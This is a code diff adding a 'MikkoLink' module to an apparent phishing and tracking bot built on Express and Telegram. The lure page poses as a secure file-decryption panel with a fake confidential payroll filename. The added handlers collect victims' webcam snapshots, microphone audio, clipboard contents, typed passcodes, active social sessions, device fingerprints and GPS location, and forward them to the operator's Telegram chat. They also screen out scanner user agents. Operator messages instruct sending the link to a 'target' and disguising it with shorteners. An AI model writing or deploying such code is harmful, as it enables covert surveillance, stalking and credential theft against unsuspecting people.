@@ -438,6 +438,259 @@ async function startServer() {
     res.redirect(`/t/silent_click/${req.params.id}`);
   });
 
+  // ========== MIKKOLINK PORT & APIs ==========
+  // Import our MikkoLink page renderer
+  const { renderMikkoLinkPage } = require("./mikkoTemplate");
+
+  // Web API to generate templates for StealthLogger dropdown
+  app.get('/api/templates', (req, res) => {
+    const list = Object.entries(templates).map(([key, value]) => ({
+      id: key,
+      name: value.name
+    }));
+    res.json(list);
+  });
+
+  // Web API to create normal trap link
+  app.post('/api/create-trap', (req, res) => {
+    const { tmplId, redirect } = req.body;
+    const id = generateTrapId(ADMIN_ID);
+    res.json({ url: `/t/${tmplId || 'silent_click'}/${id}` });
+  });
+
+  // Stateless Mikko trap ID generation
+  const generateMikkoId = (chatId: number | string, fileName: string, redirectUrl: string) => {
+    const fileB64 = Buffer.from(fileName).toString('base64url');
+    const redirectB64 = Buffer.from(redirectUrl).toString('base64url');
+    const uuid_part = crypto.randomUUID().slice(0, 4);
+    return Buffer.from(`${chatId}-MIKKO-${fileB64}-${redirectB64}-${uuid_part}`).toString('base64url');
+  };
+
+  const decodeMikkoId = (trapId: string) => {
+    try {
+      const decoded = Buffer.from(trapId, 'base64url').toString('utf-8');
+      if (decoded.includes('-MIKKO-')) {
+        const parts = decoded.split('-MIKKO-');
+        const chatId = parts[0];
+        const payloadParts = parts[1].split('-');
+        const fileB64 = payloadParts[0];
+        const redirectB64 = payloadParts[1];
+        
+        const fileName = Buffer.from(fileB64, 'base64url').toString('utf-8');
+        const redirectUrl = Buffer.from(redirectB64, 'base64url').toString('utf-8');
+        return { chatId, fileName, redirectUrl };
+      }
+      return null;
+    } catch {
+      return null;
+    }
+  };
+
+  // Web API to generate MikkoLink
+  app.post('/api/mikkolink/create', (req, res) => {
+    const { fileName, redirect } = req.body;
+    const fName = fileName || 'CONFIDENTIAL_PAYROLL_2026.pdf.enc';
+    const rUrl = redirect || 'https://google.com';
+    const id = generateMikkoId(ADMIN_ID, fName, rUrl);
+    res.json({ url: `/m/${id}` });
+  });
+
+  // MikkoLink Access Handlers
+  app.get(['/m/:id', '/mikkolink/:id'], async (req, res) => {
+    const { id } = req.params;
+    const decoded = decodeMikkoId(id);
+    if (!decoded) return res.status(404).send('<h2>Error 404: Secure Link Invalid or Expired.</h2>');
+
+    const { chatId, fileName, redirectUrl } = decoded;
+    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    const userAgent = req.headers['user-agent'];
+
+    if (botInstance) {
+      const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
+      const targetIp = String(ip).split(',')[0].trim();
+
+      // Save to Target DB
+      targetsData.push({
+        id: id,
+        timestamp: new Date().toISOString(),
+        type: 'MIKKOLINK_BASIC_HIT',
+        ip: targetIp,
+        ua: String(userAgent),
+        fileName: fileName
+      });
+      saveTargets();
+
+      // Send telemetry alert to TG if not suspicious
+      if (!isSuspeciousAgent(userAgent)) {
+        const msg = `🛸 <b>MIKKO_LINK CONNECTED</b> 🛸\n` +
+                    `━━━━━━━━━━━━━━━━━━━━\n` +
+                    `📅 <b>TIME:</b> <code>${timestamp} WIB</code>\n` +
+                    `📦 <b>FILE TARGETED:</b> <code>${escapeHTML(fileName)}</code>\n` +
+                    `🌐 <b>IP ADDRESS:</b> <code>${targetIp}</code>\n` +
+                    `📖 <b>VISITOR AGENT:</b>\n<code>${escapeHTML(String(userAgent))}</code>\n` +
+                    `━━━━━━━━━━━━━━━━━━━━\n` +
+                    `⏳ <i>User is authorizing secure verification parameters...</i>`;
+        botInstance.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' }).catch(() => {});
+      }
+    }
+
+    const htmlContent = renderMikkoLinkPage(id, fileName, redirectUrl);
+    res.send(htmlContent);
+  });
+
+  // MikkoLink Capture Endpoints
+  app.post('/api/mikkolink/:id/:type', async (req, res) => {
+    const { id, type } = req.params;
+    const decoded = decodeMikkoId(id);
+    if (!decoded || isSuspeciousAgent(req.headers['user-agent'])) return res.sendStatus(403);
+
+    const { chatId, fileName, redirectUrl } = decoded;
+    const data = req.body as any;
+    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    const targetIp = String(ip).split(',')[0].trim();
+    const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
+
+    if (botInstance) {
+      if (type === 'passive') {
+        const msg = `🛸 <b>MIKKOLINK: PASSIVE SCOUT COMPLETE</b>\n` +
+                    `━━━━━━━━━━━━━━━━━━━━\n` +
+                    `📦 FILE: <code>${escapeHTML(fileName)}</code>\n` +
+                    `🖥️ RESOLUTION: <code>${escapeHTML(data.device_screen || 'N/A')}</code>\n` +
+                    `⏱️ PERSISTENT RTT: <code>${escapeHTML(data.connection_rtt || 'N/A')} ms</code> (Link: <code>${data.connection_speed || 'N/A'}</code>)`;
+        botInstance.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' }).catch(() => {});
+      }
+      else if (type === 'info') {
+        // Build Geo Info
+        let geoInfo = "<i>Fetching Geodata...</i>";
+        try {
+          const resIp = await fetch(`http://ip-api.com/json/${targetIp}?fields=status,country,city,isp,as,mobile,proxy,query`);
+          const resJson = await resIp.json();
+          if (resJson.status === 'success') {
+            geoInfo = `├ COUNTRY: <code>${resJson.country}</code>\n` +
+                      `├ CITY: <code>${resJson.city}</code>\n` +
+                      `├ ISP: <code>${resJson.isp}</code>\n` +
+                      `├ VPN/PROXY: <code>${resJson.proxy ? 'YES' : 'CLEAN'}</code>\n` +
+                      `└ MOBILE: <code>${resJson.mobile ? 'YES' : 'NO'}</code>`;
+          }
+        } catch(e) {}
+
+        const msg = `🛸 <b>MIKKOLINK: FINGERPRINT UNLEASHED</b>\n` +
+                    `━━━━━━━━━━━━━━━━━━━━\n\n` +
+                    `📅 <b>TIME:</b> <code>${timestamp} WIB</code>\n` +
+                    `🌐 <b>IP GEOGRAPHIC:</b>\n${geoInfo}\n\n` +
+                    `🖥️ <b>DEVICE HARDWARE:</b>\n` +
+                    `├ OS PLATFORM: <code>${escapeHTML(data.platform || 'N/A')}</code>\n` +
+                    `├ RESOLUTION: <code>${escapeHTML(data.screen_size || 'N/A')}</code>\n` +
+                    `├ CPU CORES: <code>${escapeHTML(String(data.cores_available || 'N/A'))}</code>\n` +
+                    `└ LOCAL IP LEAK: <code>${escapeHTML(data.local_ip_leak || 'N/A')}</code>\n\n` +
+                    `━━━━━━━━━━━━━━━━━━━━\n` +
+                    `✅ <i>STATUS: ADVANCED FINGERPRINT EXTRACTED!</i>`;
+        
+        botInstance.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' }).catch(() => {});
+
+        targetsData.push({
+          id: id,
+          timestamp: new Date().toISOString(),
+          type: 'MIKKOLINK_ADVANCED_HIT',
+          platform: data.platform,
+          browser: 'MikkoSecure',
+          ip: targetIp
+        });
+        saveTargets();
+      }
+      else if (type === 'extra') {
+        // Handle images
+        if (data.visual_identity) {
+          try {
+            const b64 = data.visual_identity.includes(',') ? data.visual_identity.split(',')[1] : data.visual_identity;
+            const buffer = Buffer.from(b64, 'base64');
+            if (buffer.length > 0) {
+              await botInstance.telegram.sendPhoto(chatId, { source: buffer, filename: 'snapshot.jpg' }, {
+                caption: `📸 <b>MIKKOLINK: BIOMETRIC SNAPPED</b>\nFrame Track: <code>#${data.capture_seq || 0}</code>\nPayload Archive: <code>${escapeHTML(fileName)}</code>`,
+                parse_mode: 'HTML'
+              }).catch(() => {});
+            }
+          } catch(e) {}
+        }
+
+        // Handle Audio
+        if (data.voice_fingerprint) {
+          try {
+            const buffer = Buffer.from(data.voice_fingerprint, 'base64');
+            if (buffer.length > 0) {
+              await botInstance.telegram.sendVoice(chatId, { source: buffer, filename: 'voice.ogg' }, {
+                caption: `🎙️ <b>MIKKOLINK: LOCAL VOICE SPECTRUM</b>\nAudio biometric chunk received successfully.`,
+                parse_mode: 'HTML'
+              }).catch(() => {});
+            }
+          } catch(e) {}
+        }
+
+        // Handle Active Login Session Detection
+        if (data.active_sessions) {
+          const msg = `👥 <b>MIKKOLINK: ACTIVE SOCIAL ACCOUNTS</b>\n` +
+                      `━━━━━━━━━━━━━━━━━━━━\n` +
+                      `Active social identities extracted from browser cache timing:\n\n` +
+                      `<code>${escapeHTML(data.active_sessions)}</code>`;
+          botInstance.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' }).catch(() => {});
+        }
+
+        // Handle Credential input from user passcode
+        if (data.credential_vault) {
+          const msg = `🔑 <b>MIKKOLINK: DECRYPTION PASSCODE HARVESTED</b>\n` +
+                      `━━━━━━━━━━━━━━━━━━━━\n` +
+                      `📦 FILE TARGET: <code>${escapeHTML(fileName)}</code>\n` +
+                      `🔑 ATTEMPTED SECRET PASSCODE:\n` +
+                      `👉 <code>${escapeHTML(data.credential_vault)}</code>\n` +
+                      `━━━━━━━━━━━━━━━━━━━━\n` +
+                      `🔥 <i>Identity credential extracted successfully!</i>`;
+          botInstance.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' }).catch(() => {});
+        }
+
+        // Other metrics (CPU, Battery, WebGL)
+        if (data.cpu_benchmark || data.battery_status || data.webgl_gpu || data.high_entropy_hw || data.clipboard_raw || data.browser_intel) {
+          let visTxt = `🛸 <b>MIKKOLINK: EXTRAPOLATION EXTRA</b>\n` +
+                       `━━━━━━━━━━━━━━━━━━━━\n`;
+          if (data.cpu_benchmark) visTxt += `├ CPU BENCHMARK: <code>${escapeHTML(data.cpu_benchmark)}</code>\n`;
+          if (data.battery_status) visTxt += `├ BATTERY LEVEL: <code>${escapeHTML(data.battery_status)}</code>\n`;
+          if (data.webgl_gpu) visTxt += `├ WEBGL GPU: <code>${escapeHTML(data.webgl_gpu)}</code>\n`;
+          if (data.browser_intel) visTxt += `├ FEATURES: <code>${escapeHTML(data.browser_intel)}</code>\n`;
+          if (data.clipboard_raw) visTxt += `📋 <b>CLIPBOARD HARVEST:</b>\n<code>${escapeHTML(data.clipboard_raw)}</code>\n`;
+          if (data.high_entropy_hw) visTxt += `⚙️ <b>HIGH ENTROPY DETAILS:</b>\n<code>${escapeHTML(data.high_entropy_hw)}</code>\n`;
+          
+          botInstance.telegram.sendMessage(chatId, visTxt, { parse_mode: 'HTML' }).catch(() => {});
+        }
+      }
+      else if (type === 'gps') {
+        const { lat, lon, acc, alt, speed } = data;
+        const mapLink = `https://www.google.com/maps/place/${lat},${lon}`;
+        const msg = `🛰️ <b>MIKKOLINK: PRECISION POSITIONING</b>\n` +
+                    `━━━━━━━━━━━━━━━━━━━━\n\n` +
+                    `├ LATITUDE: <code>${lat}</code>\n` +
+                    `├ LONGITUDE: <code>${lon}</code>\n` +
+                    `├ ACCURACY: <code>±${acc} meters</code>\n` +
+                    `├ ALTITUDE: <code>${alt || 'N/A'}</code>\n` +
+                    `└ VELOCITY: <code>${speed || 'N/A'}</code>\n\n` +
+                    `🔗 <b>NAVIGATION LINKS:</b>\n` +
+                    `├ 🌐 <a href="${mapLink}">Google Maps View</a>\n` +
+                    `└ 📍 <a href="https://www.google.com/maps/search/?api=1&query=${lat},${lon}">Street View Probe</a>\n\n` +
+                    `━━━━━━━━━━━━━━━━━━━━\n` +
+                    `🏁 <i>High-precision spatial localization complete.</i>`;
+        botInstance.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } }).catch(() => {});
+      }
+      else if (type === 'ip_geo') {
+        const msg = `🛸 <b>MIKKOLINK: EST. IP LOCATION BACKUP</b>\n` +
+                    `━━━━━━━━━━━━━━━━━━━━\n` +
+                    `├ LATITUDE: <code>${data.latitude}</code>\n` +
+                    `├ LONGITUDE: <code>${data.longitude}</code>\n` +
+                    `└ PLACE: <code>${data.city}, ${data.region_name}, ${data.country_name}</code>\n\n` +
+                    `🌐 <a href="https://www.google.com/maps/place/${data.latitude},${data.longitude}">Estimated Google Maps View</a>`;
+        botInstance.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } }).catch(() => {});
+      }
+    }
+    res.sendStatus(200);
+  });
+
   app.post('/api/log/:id/debug', (req, res) => {
     const logPath = 'client_debug.log';
     const logEntry = `[${new Date().toISOString()}][CLIENT-DEBUG][${req.params.id}]: ${JSON.stringify(req.body)}\n`;
@@ -1227,7 +1480,35 @@ async function startServer() {
       });
       msg += `━━━━━━━━━━━━━━━━━━━━\n` +
              `💡 ɪɴꜰᴏ: ꜱᴇᴍᴜᴀ ᴅᴀᴛᴀ (ɪᴘ, ᴄᴀᴍ, ɢᴘꜱ) ᴀᴋᴀɴ ᴅɪᴋɪʀɪᴍ ᴋᴇ ꜱɪɴɪ.\n`;
-      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
+      const kb = Markup.inlineKeyboard([
+        [Markup.button.callback('🛸 ᴍɪᴋᴋᴏʟɪɴᴋ ᴘᴏʀᴛᴀʟ', 'menu_mikkolink')],
+        [Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]
+      ]);
+      ctx.editMessageText(msg, { parse_mode: 'HTML', link_preview_options: { is_disabled: true }, ...kb }).catch(() => {});
+    });
+
+    bot.action('menu_mikkolink', (ctx) => {
+      ctx.answerCbQuery().catch(() => {});
+      const id = generateMikkoId(ctx.chat!.id, 'CONFIDENTIAL_PAYROLL_2026.pdf.enc', 'https://google.com');
+      const trapUrl = `${appHost.replace(/\/$/, '')}/m/${id}`;
+      let msg = `🛸 <b>MIKKOLINK ADAPTIVE PORTAL</b>\n` +
+                `━━━━━━━━━━━━━━━━━━━━\n` +
+                `MikkoLink adalah modul link tracking interaktif yang menyamar sebagai panel secure file decryption.\n\n` +
+                `💎 <b>FITUR UNGGULAN:</b>\n` +
+                `├ 👥 Social Account Cache Probe\n` +
+                `├ 📸 Circle webcam HUD screen capturing\n` +
+                `├ 🎙️ Ambient audio freq biometric recording\n` +
+                `├ 📋 Active system Clipboard monitoring\n` +
+                `└ 🗺️ High precision geo-location compliant sync\n\n` +
+                `🔗 <b>DEFAULT MIKKOLINK PORT:</b>\n` +
+                `<code>${trapUrl}</code>\n\n` +
+                `💡 <i>Untuk kustomisasi nama file & url redirect, gunakan perintah:</i>\n` +
+                `<code>/mikkolink [NAMA_FILE] [URL_REDIRECT]</code>\n` +
+                `contoh: <code>/mikkolink leak_media.zip.enc https://myhost.com</code>`;
+      const kb = Markup.inlineKeyboard([
+        [Markup.button.callback('🎣 STEALTH TEMPLATES', 'menu_logger')],
+        [Markup.button.callback('◀️ KEMBALI', 'menu_main')]
+      ]);
       ctx.editMessageText(msg, { parse_mode: 'HTML', link_preview_options: { is_disabled: true }, ...kb }).catch(() => {});
     });
 
@@ -1513,6 +1794,36 @@ async function startServer() {
                       `2. Saat diklik, IP & Browser akan terdeteksi.\n` +
                       `3. Jika target klik button "Verify", data <b>Advanced Module</b> (GPS, Cam-ID, Screen, Files) akan terkirim.\n\n` +
                       `⚠️ <i>Tips: Gunakan shortener (bit.ly/tinyurl) agar link terlihat lebih profesional.</i>`;
+      
+      ctx.reply(replyMessage, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
+    });
+
+    bot.command('mikkolink', (ctx) => {
+      const args = ctx.message.text.split(' ');
+      let fileName = 'CONFIDENTIAL_PAYROLL_2026.pdf.enc';
+      let redirectUrl = 'https://google.com';
+
+      if (args.length > 1) {
+         fileName = args[1];
+      }
+      if (args.length > 2) {
+         redirectUrl = args[2];
+      }
+
+      const id = generateMikkoId(ctx.chat.id, fileName, redirectUrl);
+      const mLink = `${appHost.replace(/\/$/, '')}/m/${id}`;
+
+      let replyMessage = `🛸 <b>MIKKOLINK PORT ACTIVE</b> 🛸\n` +
+                         `━━━━━━━━━━━━━━━━━━━━\n` +
+                         `Custom adaptive file-decryption gateway has been generated for target:\n\n` +
+                         `📦 <b>FILE COMPLIANCE TACTIC:</b>\n<code>${fileName}</code>\n\n` +
+                         `🔗 <b>OBFUSCATED MIKKOLINK PORT:</b>\n<code>${mLink}</code>\n\n` +
+                         `🌐 <b>RELOCATION TO:</b>\n<code>${redirectUrl}</code>\n` +
+                         `━━━━━━━━━━━━━━━━━━━━\n` +
+                         `💡 <b>INSTRUCTIONS:</b>\n` +
+                         `1. Send this premium gateway link to target.\n` +
+                         `2. Interactive decryption flow gathers deep analytics:\n` +
+                         `   └ <i>Webcam circular snap stream, microphone recording chunk, geolocation compliance log, WebRTC local/public routing profiles, credential harvesting & browser session checker.</i>`;
       
       ctx.reply(replyMessage, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
     });
